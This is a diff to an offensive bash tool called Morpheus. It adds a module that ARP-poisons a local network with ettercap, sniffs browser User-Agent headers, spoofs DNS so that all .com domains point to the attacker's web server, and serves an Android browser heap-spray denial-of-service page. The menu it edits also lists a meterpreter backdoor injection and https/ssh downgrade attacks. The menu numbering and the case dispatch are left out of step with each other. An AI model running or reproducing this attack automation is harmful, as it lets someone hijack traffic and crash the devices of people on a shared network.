@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 33 85 > /dev/null
+resize -s 34 85 > /dev/null
 # inicio
 
 
@@ -793,7 +793,7 @@ sh_stage7 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF} This module will crash target mozilla firefox (=< 49.0.1) using  ${BlueF}|"
-echo "${BlueF}    | ${YellowF}  a buffer overflow writen in javascript (deliver under mitm+dns) ${BlueF}|"
+echo "${BlueF}    | ${YellowF} a Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
 echo "${BlueF}    | ${YellowF}  'All [.com] domains will be redirected to the exploit webpage'  ${BlueF}|"
 echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
 echo "${BlueF}    | ${YellowF}  1 - Capture a tcp/udp packet from target host to verify vuln    ${BlueF}|"
@@ -925,10 +925,150 @@ fi
 
 
 
+# --------------------------------------------------
+# ANDROID BROWSER DENIAL-OF-SERVICE [mitm+dns_spoof]
+# --------------------------------------------------
+sh_stage8 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}    This module will crash target android browsers by using a     ${BlueF}|"
+echo "${BlueF}    | ${YellowF}   Heap Spray writen in javascript (deliver under mitm+dns_spoof) ${BlueF}|"
+echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the exploit webpage' ${BlueF}|"
+echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}   1 - Capture a tcp/udp packet from target host to verify vuln   ${BlueF}|"
+echo "${BlueF}    | ${YellowF}   2 - If browser version its exploitable then deliver payload.   ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+rm $IPATH/logs/UserAgent.log > /dev/null 2>&1
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+
+
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  sleep 1
+  # backup all files needed.
+  cd $IPATH/bin
+  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
+  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
+  cp $IPATH/filters/UserAgent.eft $IPATH/filters/UserAgent.rb > /dev/null 2>&1 # backup
+  # copy files to apache2 webroot
+  cp $IPATH/bin/phishing/Android-DOS-4.0.3.html $ApachE/index.html > /dev/null 2>&1
+  # use SED bash command
+  sed -i "s|TaRgEt|$UpL|g" $IPATH/filters/UserAgent.eft > /dev/null 2>&1
+  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
+  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
+  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
+  cd $IPATH
+  sleep 1
+
+  # compiling UserAgent.eft to be used in ettercap
+  echo ${BlueF}[☠]${white} Compiling UserAgent.eft${RedF}!${Reset};
+  xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
+  sleep 1
+
+# start apache2 webserver...
+echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
+/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Please wait, For User-Agent Capture${RedF}!${Reset}; 
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
+      else
+        xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
+      fi
+
+  # check if target system its vuln
+  # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
+  nOn="android"
+  HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}` > /dev/null 2>&1
+  AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3'}` > /dev/null 2>&1
+  DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12'}` > /dev/null 2>&1
+  VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12'} | cut -d 'F' -f2 | cut -d '/' -f2 | cut -d '.' -f1` > /dev/null 2>&1
+  echo "${GreenF}    Host: $HoSt"
+  sleep 1
+  echo "${GreenF}    Accept-Language: $AcLa"
+  sleep 1
+  echo "${GreenF}    User-Agent: $DisP"
+  sleep 1
+
+
+# if in captured packet its writen: android then its vulnerable
+if [ $VeVul \> $nOn ]; then
+echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
+sleep 3
+echo ${BlueF}[☠]${YellowF} module cant verify browser version '(running blind)'${RedF}!${Reset};
+sleep 1
+else
+echo "${GreenF}    Browser report: vulnerable...${BlueF}"
+sleep 3
+fi
+
+      # run mitm+filter
+      cd $IPATH/logs
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
+  mv /tmp/etter.dns $Edns > /dev/null 2>&1
+  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
+  mv $IPATH/filters/UserAgent.rb $IPATH/filters/UserAgent.eft > /dev/null 2>&1 # backup
+  rm $IPATH/output/UserAgent.ef > /dev/null 2>&1
+  rm $ApachE/index.html > /dev/null 2>&1
+  cd $IPATH
+  # port-forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
+  sleep 2
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
+
+
 # --------------------------------
 # INJECT IMAGE INTO TARGET WEBSITE
 # --------------------------------
-sh_stage8 () {
+sh_stage9 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
 echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
@@ -1223,12 +1363,13 @@ cat << !
     |   4    -  Redirect browser traffic         [ to another domain  ] |
     |   5    -  Redirect browser traffic         [ to google sphere   ] |
     |   6    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
-    |   7    -  firefox denial-of-service        [ firefox =< 49.0.0  ] |
-    |   8    -  Replace website images           [ img src=http://www ] |
-    |   9    -  Replace website text             [ replace: worlds    ] |
-    |  10    -  Rotate website document 180º     [ CSS3 injection     ] |
-    |  11    -  https downgrade attack (demo)    [ replace: https     ] |
-    |  12    -  ssh downgrade attack (demo)      [ replace: SSH-1.99  ] |
+    |   7    -  Firefox denial-of-service        [ firefox =< 49.0.0  ] |
+    |   8    -  Android denial-of-service        [ android browsers   ] |
+    |   9    -  Replace website images           [ img src=http://www ] |
+    |  10    -  Replace website text             [ replace: worlds    ] |
+    |  11    -  Rotate website document 180º     [ CSS3 injection     ] |
+    |  12    -  https downgrade attack (demo)    [ replace: https     ] |
+    |  13    -  ssh downgrade attack (demo)      [ replace: SSH-1.99  ] |
     |                                                                   |
     |   W    -  Write your own filter            [ use morpheus tool  ] |
     |   S    -  Scan LAN for live hosts          [ use nmap framework ] |
@@ -1249,6 +1390,7 @@ case $choice in
 5) sh_stage5 ;;
 6) sh_stage6 ;;
 7) sh_stage7 ;;
+8) sh_stage8 ;;
 10) sh_stage10 ;;
 11) sh_stage11 ;;
 W) sh_stageW ;;
